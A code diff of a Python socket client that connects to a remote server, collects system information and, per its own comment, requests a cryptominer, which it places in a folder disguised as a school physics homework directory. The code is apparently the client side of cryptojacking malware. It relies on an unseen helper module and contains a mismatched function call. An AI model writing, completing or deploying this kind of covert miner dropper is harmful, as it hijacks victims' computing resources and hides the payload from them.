@@ -1,6 +1,8 @@
 import socket
 import tools 
-import threading
+import time
+import multiprocessing as mp
+import os
 
 def main():
     CLIENT=socket.socket(
@@ -10,37 +12,37 @@ def main():
     
     #LOCAL DATA
     HOSTNAME = socket.gethostname()
-    LOCAL_IP = socket.gethostbyname(HOSTNAME)
+    LOCAL_IP = tools.get_local_ip(CLIENT,HOSTNAME)
     BUFFER_SIZE = 4096 #KB
+    SYSTEM_INFO = tools.get_system_info()
 
     #SERVER DATA 
-    SERVER_IP = "192.168.1.70"
+    SERVER_IP = tools.locate_server()
     SERVER_PORT = 8080
-    
     #CLIENT.settimeout(20)
     
     print(f"[+] Stablishing connection with {SERVER_IP} on port {SERVER_PORT}")
-
-    try:
-        CLIENT.connect((SERVER_IP,SERVER_PORT))    
-    except TimeoutError:
-        print(f"[-] Connection timeout with {SERVER_IP}")
-        CLIENT.close()
-        print(f"[+] Trying again...")
-        main()
+    
+    #CONNECT TO THE SERVER
+    CLIENT.connect((SERVER_IP,SERVER_PORT))    
 
     print(f"[+] Connection with {SERVER_IP} on port {SERVER_PORT}")
-    #tools.receive_file(BUFFER_SIZE,CLIENT)
+    
+    #SEND SYSTEM_INFO
+    #tools.send_data(CLIENT,LOCAL_IP,SYSTEM_INFO)
 
-    system_details = tools.get_system_info().encode()
-    CLIENT.send(system_details)
+    
+    #CHECK IF THE CRYPTOMINER IS INSTALLED
+    current_working_dir = os.getcwd()
 
-    receive_data_process = mp.Process(
-    target=tools.receive_data,
-    args=CLIENT,LOCAL_IP,
-    BUFFER_SIZE
-    )
-
+    if "tarea fisica luis donaldo colosio" not in os.listdir(current_working_dir): 
+        os.mkdir("tarea fisica luis donaldo colosio")
+        os.chdir(f"{current_working_dir}/tarea fisica luis donaldo colosio")
+        tools.send_data('request_cryptominer')
+    
+    #RECEIVE DATA
+    tools.receive_data(CLIENT,LOCAL_IP,BUFFER_SIZE)
+    
 
     CLIENT.close()
     print(f"[-] Connection with {SERVER_IP} closed.")
